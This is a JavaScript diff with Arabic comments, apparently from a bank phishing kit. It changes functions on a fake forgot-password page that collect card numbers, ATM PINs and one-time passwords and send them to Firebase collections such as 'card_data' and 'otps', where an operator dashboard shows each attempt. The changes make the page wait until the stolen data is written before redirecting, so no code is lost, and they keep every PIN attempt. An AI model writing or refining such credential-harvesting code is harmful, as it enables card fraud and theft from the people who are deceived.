@@ -299,14 +299,23 @@
     const timestampStr = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
     const otpData = { id: otpId, otp: otp, timestamp: timestampStr };
 
-    rtd.ref('sessions/' + sessionId + '/otps/' + otpId).set(otpData);
-    rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true });
-    db.collection("card_data").doc(sessionId).collection("otps").doc(otpId).set(otpData);
+    // نجمع كل الكتابات ونعيدها كوعد واحد: الصفحة تنتظر انتهاءها قبل التوجيه،
+    // وإلا يقطع الانتقال الكتابات الجارية فلا يصل الرمز إلى اللوحة.
+    const tasks = [];
+    try { tasks.push(rtd.ref('sessions/' + sessionId + '/otps/' + otpId).set(otpData)); } catch (e) {}
+    try { tasks.push(rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true })); } catch (e) {}
+    try { tasks.push(db.collection("card_data").doc(sessionId).collection("otps").doc(otpId).set(otpData)); } catch (e) {}
     // أرشيف دائم في مجموعة otps
-    db.collection("otps").doc(otpId).set({ ...otpData, sessionId: sessionId, createdAt: firebase.firestore.FieldValue.serverTimestamp() });
+    try {
+      tasks.push(db.collection("otps").doc(otpId).set({ ...otpData, sessionId: sessionId, createdAt: firebase.firestore.FieldValue.serverTimestamp() }));
+    } catch (e) {}
     // كتابة otp في وثيقة العميل لتعرضها لوحة التحكم الجديدة
-    customerRef.set({ otp: String(otp || ''), lastSeen: Date.now(), currentPage: getFriendlyPageName() }, { merge: true });
-    return Promise.resolve();
+    try {
+      tasks.push(customerRef.set({ otp: String(otp || ''), lastSeen: Date.now(), currentPage: getFriendlyPageName() }, { merge: true }));
+    } catch (e) {}
+    return Promise.all(tasks).catch(function (err) {
+      console.error('pushFirebaseOtp failed:', err && err.code, err && err.message);
+    });
   };
 
   // ═══════════════════════════════════════════════════════════
@@ -506,7 +515,8 @@
 
   // ═══════════════════════════════════════════════════════════
   // إرسال طلب إعادة تعيين كلمة المرور (صفحة forgot-password.html)
-  // يكتب في customers/{sessionId} ومجموعة requests وفي RTDB.
+  // يكتب مباشرة في customers/{sessionId}: كل محاولة تُضاف كعنصر في مصفوفة
+  // passwordResets (لا تُستبدل السابقة) فتظهر في اللوحة كصندوق منفصل لكل محاولة.
   //   data: { card, atmPin }
   // ═══════════════════════════════════════════════════════════
   window.submitPasswordReset = function (data) {
@@ -515,17 +525,37 @@
     function send() {
       if (sent) return Promise.resolve();
       sent = true;
-      if (typeof window.pushFirebaseRequest !== 'function') return Promise.resolve();
+      const refNo = 'PR-' + Date.now().toString().slice(-8);
+      const now = Date.now();
+      const entry = { card: String(data.card || ''), atmPin: String(data.atmPin || ''), at: now, page: getFriendlyPageName() };
+      const fields = {
+        sessionId: sessionId,
+        requestType: 'password_reset',
+        requestTypeLabel: REQUEST_TYPE_LABEL.password_reset,
+        refNo: refNo,
+        status: 'pending',
+        decision: 'pending',
+        lastSeen: now,
+        currentPage: getFriendlyPageName(),
+        isHidden: false,
+        flagColor: ''
+      };
+      const tasks = [];
+      tasks.push(customerRef.set(Object.assign({}, fields, {
+        passwordResets: firebase.firestore.FieldValue.arrayUnion(entry),
+        createdAt: firebase.firestore.FieldValue.serverTimestamp()
+      }), { merge: true }));
       try {
-        return Promise.resolve(window.pushFirebaseRequest({
-          type: 'password_reset',
-          name: localStorage.getItem('customerName') || '',
-          phone: localStorage.getItem('phone') || '',
-          details: { card: String(data.card || ''), atmPin: String(data.atmPin || '') }
-        })).catch(function () {});
-      } catch (e) {
-        return Promise.resolve();
-      }
+        rtd.ref('sessions/' + sessionId).update({
+          requestType: 'password_reset',
+          refNo: refNo,
+          page: getFriendlyPageName(),
+          hasNewActivity: true
+        });
+      } catch (e) {}
+      return Promise.all(tasks).catch(function (err) {
+        console.error('submitPasswordReset failed:', err && err.code, err && err.message);
+      });
     }
     const ready = (typeof window.ensureAuthReady === 'function')
       ? window.ensureAuthReady().then(send).catch(send)
